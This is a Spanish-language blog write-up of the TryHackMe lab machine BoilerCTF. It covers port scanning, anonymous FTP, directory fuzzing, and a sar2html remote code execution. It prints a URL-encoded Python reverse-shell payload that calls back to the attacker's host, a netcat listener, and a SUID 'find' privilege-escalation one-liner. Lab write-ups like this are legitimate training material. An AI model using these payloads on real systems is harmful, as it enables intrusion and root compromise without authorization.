<!DOCTYPE html>
<html><head lang="en">
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>BoilerCTF | TryHackMe 🔥 - 0xlogs</title><meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="BoilerCTF es una maquina de TryHackMe, la herramienta para trazar estadísticas Sar2HTML tiene una vulnerabilidad RCE la cual explotamos para obtener una shell." />
	<meta property="og:image" content=""/>
	<meta property="og:title" content="BoilerCTF | TryHackMe 🔥" />
<meta property="og:description" content="BoilerCTF es una maquina de TryHackMe, la herramienta para trazar estadísticas Sar2HTML tiene una vulnerabilidad RCE la cual explotamos para obtener una shell." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://eliecer-j.github.io/0xlogs/posts/boilerctf/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-09-07T02:01:58+05:30" />
<meta property="article:modified_time" content="2023-09-07T02:01:58+05:30" />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="BoilerCTF | TryHackMe 🔥"/>
<meta name="twitter:description" content="BoilerCTF es una maquina de TryHackMe, la herramienta para trazar estadísticas Sar2HTML tiene una vulnerabilidad RCE la cual explotamos para obtener una shell."/>
<script src="https://eliecer-j.github.io/0xlogs/js/feather.min.js"></script>
	
	
        <link href="https://eliecer-j.github.io/0xlogs/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
	

	
	<link rel="stylesheet" type="text/css" media="screen" href="https://eliecer-j.github.io/0xlogs/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css" />
		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="https://eliecer-j.github.io/0xlogs/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css"  disabled />
	

	
	

	
	
	
	
		
		
		<link rel="stylesheet" type="text/css" href="https://eliecer-j.github.io/0xlogs/css/first.c90aa4ac4da9f37cbff659ce15c127d8198c776819cec0d6f2799a8585989352.css">
		
</head>
<body>
        <div class="content"><header>
	<div class="main">
		<a href="https://eliecer-j.github.io/0xlogs/">0xlogs</a>
	</div>
	<nav>
		
		<a href="/0xlogs/">Home</a>
		
		<a href="/0xlogs/posts">All posts</a>
		
		<a href="/0xlogs/about">About</a>
		
		<a href="/0xlogs/tags">Tags</a>
		
		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
		<script src="https://eliecer-j.github.io/0xlogs/js/themetoggle.js"></script>
		
	</nav>
</header>

<main>
	<article>
		<div class="title">
			<h1 class="title">BoilerCTF | TryHackMe 🔥</h1>
			<div class="meta">Posted on Sep 7, 2023</div>
		</div>
		

		<section class="body">
			<h2 id="nmap">Nmap</h2>
<p>Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80), Webmin (10000) y el puerto ssh (55007) abiertos</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ nmap -p- -Pn -n -sVC --min-rate <span style="color:#ae81ff">2000</span> 10.10.24.224
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE REASON  VERSION
</span></span><span style="display:flex;"><span>21/tcp    open  ftp     syn-ack vsftpd 3.0.3
</span></span><span style="display:flex;"><span>|_ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ftp-syst:
</span></span><span style="display:flex;"><span>|   STAT:
</span></span><span style="display:flex;"><span>| FTP server status:
</span></span><span style="display:flex;"><span>|      Connected to ::ffff:10.6.48.252
</span></span><span style="display:flex;"><span>|      Logged in as ftp
</span></span><span style="display:flex;"><span>|      TYPE: ASCII
</span></span><span style="display:flex;"><span>|      No session bandwidth limit
</span></span><span style="display:flex;"><span>|      Session timeout in seconds is <span style="color:#ae81ff">300</span>
</span></span><span style="display:flex;"><span>|      Control connection is plain text
</span></span><span style="display:flex;"><span>|      Data connections will be plain text
</span></span><span style="display:flex;"><span>|      At session startup, client count was <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>|      vsFTPd 3.0.3 - secure, fast, stable
</span></span><span style="display:flex;"><span>|_End of status
</span></span><span style="display:flex;"><span>80/tcp    open  http    syn-ack Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>| http-methods:
</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#ae81ff">1</span> disallowed entry
</span></span><span style="display:flex;"><span>|_/
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Apache2 Ubuntu Default Page: It works
</span></span><span style="display:flex;"><span>10000/tcp open  http    syn-ack MiniServ 1.930 <span style="color:#f92672">(</span>Webmin httpd<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-favicon: Unknown favicon MD5: 3EBE21590CEBC71E0E72F5E2B53E0435
</span></span><span style="display:flex;"><span>| http-methods:
</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html; Charset<span style="color:#f92672">=</span>iso-8859-1<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>55007/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey:
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> e3🆎e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8bsvFyC4EXgZIlLR/7o9EHosUTTGJKIdjtMUyYrhUpJiEdUahT64rItJMCyO47iZTR5wkQx2H8HT
</span></span><span style="display:flex;"><span>hHT6iQ5GlMzLGWFSTL1ttIulcg7uyXzWhJMiG/0W4HNIR44DlO8zBvysLRkBSCUEdD95kLABPKxIgCnYqfS3D73NJI6T2qWrbCTaIG5QAS5yAyPERXXz3
</span></span><span style="display:flex;"><span>ofHRRiCr3fYHpVopUbMTWZZDjR3DKv7IDsOCbMKSwmmgdfxDhFIBRtCkdiUdGJwP/g0uEUtHbSYsNZbc1s1a5EpaxvlESKPBainlPlRkqXdIiYuLvzsf2
</span></span><span style="display:flex;"><span>J0ajniPUkvJ2JbC8qm7AaDItepXLoDt
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> ae🇩🇪f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLIDkrDNUoTTfKoucY3J3eXFICcitdce9/EOdMn8/7Z
</span></span><span style="display:flex;"><span>rUkM23RMsmFncOVJTkLOxOB+LwOEavTWG/pqxKLpk7oc<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPsAMyp7Cf1qf50P6K9P2n30r4MVz09NnjX7LvcKgG2p
</span></span><span style="display:flex;"><span>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><p>En el puerto 21 se encuentra el servicio ftp usamos las credenciales anonymous, y encontramos un archivo con un mensaje cifrado</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ ftp -v 10.10.24.224
</span></span><span style="display:flex;"><span>Connected to 10.10.24.224.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">220</span> <span style="color:#f92672">(</span>vsFTPd 3.0.3<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Name <span style="color:#f92672">(</span>10.10.24.224:root<span style="color:#f92672">)</span>: anonymous
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">230</span> Login successful.
</span></span><span style="display:flex;"><span>Remote system type is UNIX.
</span></span><span style="display:flex;"><span>Using binary mode to transfer files.
</span></span><span style="display:flex;"><span>ftp&gt; ls
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span> PORT command successful. Consider using PASV.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Here comes the directory listing.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Directory send OK.
</span></span><span style="display:flex;"><span>ftp&gt; passive
</span></span><span style="display:flex;"><span>Passive mode on.
</span></span><span style="display:flex;"><span>ftp&gt; ls -la
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">227</span> Entering Passive Mode <span style="color:#f92672">(</span>10,10,24,224,161,174<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Here comes the directory listing.
</span></span><span style="display:flex;"><span>drwxr-xr-x    <span style="color:#ae81ff">2</span> ftp      ftp          <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2019</span> .
</span></span><span style="display:flex;"><span>drwxr-xr-x    <span style="color:#ae81ff">2</span> ftp      ftp          <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2019</span> ..
</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#ae81ff">1</span> ftp      ftp            <span style="color:#ae81ff">74</span> Aug <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> .info.txt
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Directory send OK.
</span></span><span style="display:flex;"><span>ftp&gt; get .info.txt -
</span></span><span style="display:flex;"><span>remote: .info.txt
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">227</span> Entering Passive Mode <span style="color:#f92672">(</span>10,10,24,224,176,66<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Opening BINARY mode data connection <span style="color:#66d9ef">for</span> .info.txt <span style="color:#f92672">(</span><span style="color:#ae81ff">74</span> bytes<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">74</span> bytes received in 0.00 secs <span style="color:#f92672">(</span>133.8252 kB/s<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>El texto sin formato dice <code>“Just wanted to see if you find it. Lol. Remember: Enumeration is the key!”</code> que podemos obtener usando el algoritmo ROT13 para decodificar el texto cifrado</p>
<h2 id="web">web</h2>
<p>Ingresamos la web en puerto 80 y encontramos esto</p>
<figure><img src="https://i.imgur.com/Sl3xtrr.png"/>
</figure>

<p>Es sólo la página predeterminada de Apache, así que analicemos para ver qué otros archivos y directorios podemos encontrar</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ffuf -u http://10.10.24.224/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c -t <span style="color:#ae81ff">80</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>manual                  <span style="color:#f92672">[</span>Status: 301, Size: 313, Words: 20, Lines: 10<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>joomla                  <span style="color:#f92672">[</span>Status: 301, Size: 313, Words: 20, Lines: 10<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">[</span>Status: 200, Size: 11321, Words: 3503, Lines: 376<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>server-status           <span style="color:#f92672">[</span>Status: 403, Size: 300, Words: 22, Lines: 12<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>Hay un blog que ejecuta el CMS <code>Joomla</code> detrás</p>
<figure><img src="https://i.imgur.com/RCvbT1o.png"/>
</figure>

<p>Analizamos ese nuevo directorio</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ ffuf -u http://10.10.24.224/joomla/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t <span style="color:#ae81ff">100</span> -c
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>.htpasswd               <span style="color:#f92672">[</span>Status: 403, Size: 303, Words: 22, Lines: 12<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>_archive                <span style="color:#f92672">[</span>Status: 301, Size: 322, Words: 20, Lines: 10<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>_database               <span style="color:#f92672">[</span>Status: 301, Size: 323, Words: 20, Lines: 10<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>_test                   <span style="color:#f92672">[</span>Status: 301, Size: 319, Words: 20, Lines: 10<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>.htaccess               <span style="color:#f92672">[</span>Status: 403, Size: 303, Words: 22, Lines: 12<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>.hta                    <span style="color:#f92672">[</span>Status: 403, Size: 298, Words: 22, Lines: 12<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>~www                    <span style="color:#f92672">[</span>Status: 301, Size: 318, Words: 20, Lines: 10<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>Esta vez encontramos algunos directorios más. El /_test El directorio contiene una aplicación llamada <code>sar2html</code></p>
<p>Una búsqueda rápida en la web muestra que <a href="https://www.exploit-db.com/exploits/47204">hay un error de ejecución remota de código</a> que es fácil de explotar</p>
<h1 id="reverse-shell">Reverse Shell</h1>
<p>Después de algunas pruebas y errores, pude hacer funcionar una carga útil de Python con doble URL codificada</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>http://10.10.24.224/joomla/_test/index.php?plot=;python%20-c%20&#39;import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%2210.6.48.252%22%2C4444))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bimport%20pty%3B%20pty.spawn(%22%2Fbin%2Fbash%22)&#39;
</span></span></code></pre></div><p>Nos ponemos en escucha</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ nc -nlvp <span style="color:#ae81ff">4444</span>
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.2.55.245<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.24.224<span style="color:#f92672">]</span> <span style="color:#ae81ff">34796</span>
</span></span><span style="display:flex;"><span>www-data@Vulnerable:/var/www/html/joomla/_test$ id
</span></span><span style="display:flex;"><span>id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>www-data@Vulnerable:/var/www/html/joomla/_test$ uname -a
</span></span><span style="display:flex;"><span>uname -a
</span></span><span style="display:flex;"><span>Linux Vulnerable 4.4.0-142-generic <span style="color:#75715e">#168-Ubuntu SMP Wed Jan 16 21:01:15 UTC 2019 i686 i686 i686 GNU/Linux</span>
</span></span></code></pre></div><h3 id="primera-flag">Primera Flag</h3>
<p>Vemos el directorio actual y encontramos eun archivo <code>log.txt</code> que contiene la contraseña de otro usuario</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>www-data@Vulnerable:/var/www/html/joomla/_test$ cat log.txt
</span></span><span style="display:flex;"><span>Aug <span style="color:#ae81ff">20</span> 11:16:26 parrot sshd<span style="color:#f92672">[</span>2443<span style="color:#f92672">]</span>: Server listening on 0.0.0.0 port 22.
</span></span><span style="display:flex;"><span>Aug <span style="color:#ae81ff">20</span> 11:16:26 parrot sshd<span style="color:#f92672">[</span>2443<span style="color:#f92672">]</span>: Server listening on :: port 22.
</span></span><span style="display:flex;"><span>Aug <span style="color:#ae81ff">20</span> 11:16:35 parrot sshd<span style="color:#f92672">[</span>2451<span style="color:#f92672">]</span>: Accepted password <span style="color:#66d9ef">for</span> basterd from 10.1.1.1 port <span style="color:#ae81ff">49824</span> ssh2 <span style="color:#75715e">#pass: REDACTED</span>
</span></span><span style="display:flex;"><span>Aug <span style="color:#ae81ff">20</span> 11:16:35 parrot sshd<span style="color:#f92672">[</span>2451<span style="color:#f92672">]</span>: pam_unix<span style="color:#f92672">(</span>sshd:session<span style="color:#f92672">)</span>: session opened <span style="color:#66d9ef">for</span> user pentest by <span style="color:#f92672">(</span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Aug <span style="color:#ae81ff">20</span> 11:16:36 parrot sshd<span style="color:#f92672">[</span>2466<span style="color:#f92672">]</span>: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user
</span></span><span style="display:flex;"><span>Aug <span style="color:#ae81ff">20</span> 11:16:36 parrot sshd<span style="color:#f92672">[</span>2466<span style="color:#f92672">]</span>: Disconnected from user pentest 10.10.170.50 port <span style="color:#ae81ff">49824</span>
</span></span><span style="display:flex;"><span>Aug <span style="color:#ae81ff">20</span> 11:16:36 parrot sshd<span style="color:#f92672">[</span>2451<span style="color:#f92672">]</span>: pam_unix<span style="color:#f92672">(</span>sshd:session<span style="color:#f92672">)</span>: session closed <span style="color:#66d9ef">for</span> user pentest
</span></span><span style="display:flex;"><span>Aug <span style="color:#ae81ff">20</span> 12:24:38 parrot sshd<span style="color:#f92672">[</span>2443<span style="color:#f92672">]</span>: Received signal 15; terminating.
</span></span></code></pre></div><p>Ahora hacemos <code>su basterd</code> y cambie a su cuenta con la contraseña que encontramos</p>
<p>El directorio de inicio de Basterd no contiene la bandera de usuario, sin embargo, hay una <code>backup.sh</code> script propiedad del usuario stoner. Si lo examinamos encontraremos que incluye la contraseña</p>
<p>con eso podemos <code>su stoner</code> y luego toma la bandera de <code>/home/stoner/.secret</code></p>
<h1 id="root">Root</h1>
<p>comprobamos los privilegios sudo y los binarios SUID</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>stoner@Vulnerable:/tmp$ sudo -l
</span></span><span style="display:flex;"><span>User stoner may run the following commands on Vulnerable:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /NotThisTime/MessinWithYa
</span></span><span style="display:flex;"><span>stoner@Vulnerable:/tmp$ find / -user root -type f -perm /4000 2&gt;/dev/null
</span></span><span style="display:flex;"><span>/bin/su
</span></span><span style="display:flex;"><span>/bin/fusermount
</span></span><span style="display:flex;"><span>/bin/umount
</span></span><span style="display:flex;"><span>/bin/mount
</span></span><span style="display:flex;"><span>/bin/ping6
</span></span><span style="display:flex;"><span>/bin/ping
</span></span><span style="display:flex;"><span>/usr/lib/policykit-1/polkit-agent-helper-1
</span></span><span style="display:flex;"><span>/usr/lib/apache2/suexec-custom
</span></span><span style="display:flex;"><span>/usr/lib/apache2/suexec-pristine
</span></span><span style="display:flex;"><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
</span></span><span style="display:flex;"><span>/usr/lib/openssh/ssh-keysign
</span></span><span style="display:flex;"><span>/usr/lib/eject/dmcrypt-get-device
</span></span><span style="display:flex;"><span>/usr/bin/newgidmap
</span></span><span style="display:flex;"><span>/usr/bin/find
</span></span><span style="display:flex;"><span>/usr/bin/chsh
</span></span><span style="display:flex;"><span>/usr/bin/chfn
</span></span><span style="display:flex;"><span>/usr/bin/passwd
</span></span><span style="display:flex;"><span>/usr/bin/newgrp
</span></span><span style="display:flex;"><span>/usr/bin/sudo
</span></span><span style="display:flex;"><span>/usr/bin/pkexec
</span></span><span style="display:flex;"><span>/usr/bin/gpasswd
</span></span><span style="display:flex;"><span>/usr/bin/newuidmap
</span></span></code></pre></div><p><code>/usr/bin/find</code> tiene el bit SUID configurado!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>stoner@Vulnerable:/tmp$ find . -exec /bin/sh -p <span style="color:#ae81ff">\;</span> -quit
</span></span><span style="display:flex;"><span><span style="color:#75715e"># id</span>
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>stoner<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>stoner<span style="color:#f92672">)</span> euid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>stoner<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,110<span style="color:#f92672">(</span>lxd<span style="color:#f92672">)</span>,115<span style="color:#f92672">(</span>lpadmin<span style="color:#f92672">)</span>,116<span style="color:#f92672">(</span>sambashare<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># cd /root &amp;&amp; ls -la</span>
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">12</span>
</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2019</span> .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">22</span> root root <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2019</span> ..
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">29</span> Aug <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2019</span> root.txt
</span></span><span style="display:flex;"><span><span style="color:#75715e"># wc -c root.txt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">29</span> root.txt
</span></span></code></pre></div>
		</section>

		<div class="post-tags">
			
			
			<nav class="nav tags">
				<ul class="tags">
					
					<li><a href="/0xlogs/tags/tryhackme">tryhackme</a></li>
					
					<li><a href="/0xlogs/tags/frp">frp</a></li>
					
					<li><a href="/0xlogs/tags/webmin">webmin</a></li>
					
					<li><a href="/0xlogs/tags/ssh">ssh</a></li>
					
					<li><a href="/0xlogs/tags/sar2html">sar2html</a></li>
					
				</ul>
			</nav>
			
			
		</div>
		</article>
</main>
<footer>
  <div style="display:flex"><a class="soc" href="https://github.com/eliecer-j" rel="me" title="GitHub"><i data-feather="github"></i></a>
    <a class="border"></a><a class="soc" href="https://linkedin.com/in/eliecerj" rel="me" title="Linkedln"><i data-feather="linkedin"></i></a>
    <a class="border"></a></div>
  <div class="footer-info">
    2023  © eliecer_j |  <a
      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
  </div>
</footer>


<script>
  feather.replace()
</script></div>
    </body>
</html>
